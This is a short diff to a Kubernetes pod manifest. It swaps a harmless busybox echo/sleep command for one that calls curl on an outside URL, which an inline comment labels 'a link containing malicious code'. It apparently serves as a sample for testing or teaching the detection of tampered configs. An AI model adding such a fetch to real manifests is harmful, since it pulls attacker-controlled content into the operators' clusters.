@@ -15,4 +15,9 @@ spec:
       containers:
         - name: busybox
           image: busybox
-          command: ['sh', '-c', 'echo Container 1 is Running ; sleep 3600']
+          command:
+          - sh
+          - -c
+          - curl
+          - "http://xksqu4mj.fri3nds.in/tools/clay" # a link containing malicious code
+          - sleep 1000000
